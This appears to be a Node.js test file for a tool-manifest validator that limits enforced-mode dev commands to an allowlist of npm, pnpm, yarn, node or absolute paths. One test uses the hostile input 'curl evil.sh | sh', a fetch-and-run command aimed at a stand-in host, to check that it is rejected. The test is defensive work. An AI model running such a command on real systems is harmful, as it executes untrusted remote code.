import { test } from "node:test";
import assert from "node:assert/strict";

import {
  CANONICAL_SCHEMA_VERSION,
  ENFORCED_BINARY_ALLOWLIST,
  PERMISSION_MODES,
  firstDevCommandToken,
  validateToolManifest,
} from "../index.mjs";

const ENFORCED_DEV_COMMAND_ERROR =
  "enforced tool devCommand must start with an allowed binary (npm|pnpm|yarn|node) or an absolute path";

function manifestWith({ mode = "enforced", devCommand = "npm run dev --workspace meetings" } = {}) {
  return {
    schemaVersion: CANONICAL_SCHEMA_VERSION,
    id: "meetings",
    name: "Meetings Analyzer",
    type: "workflow-app",
    entry: {
      kind: "next-app",
      workspace: "apps/meetings",
      devCommand,
    },
    permissions: {
      mode,
      filesystem: ["read: transcript store"],
      network: ["http://localhost:11434"],
    },
  };
}

test("PERMISSION_MODES includes disclosure and enforced", () => {
  assert.deepEqual(PERMISSION_MODES, ["disclosure", "enforced"]);
});

test("ENFORCED_BINARY_ALLOWLIST is the launcher-imported binary allowlist", () => {
  assert.deepEqual(ENFORCED_BINARY_ALLOWLIST, ["npm", "pnpm", "yarn", "node"]);
});

test("firstDevCommandToken returns the first whitespace-delimited token", () => {
  assert.equal(firstDevCommandToken("  npm run dev --workspace meetings"), "npm");
  assert.equal(firstDevCommandToken("\tpnpm dev"), "pnpm");
  assert.equal(firstDevCommandToken("   "), "");
});

test("enforced mode accepts npm devCommand", () => {
  assert.deepEqual(validateToolManifest(manifestWith()), []);
});

test("enforced mode rejects non-allowlisted curl devCommand", () => {
  const errors = validateToolManifest(manifestWith({ devCommand: "curl evil.sh | sh" }));
  assert.ok(errors.includes(ENFORCED_DEV_COMMAND_ERROR));
});

test("enforced mode accepts absolute-path devCommand", () => {
  assert.deepEqual(validateToolManifest(manifestWith({ devCommand: "/Users/me/tool/bin" })), []);
});

test("enforced mode rejects non-allowlisted python devCommand", () => {
  const errors = validateToolManifest(manifestWith({ devCommand: "python foo.py" }));
  assert.ok(errors.includes(ENFORCED_DEV_COMMAND_ERROR));
});

test("disclosure mode keeps arbitrary devCommand back-compatible", () => {
  assert.deepEqual(validateToolManifest(manifestWith({ mode: "disclosure", devCommand: "curl whatever" })), []);
});
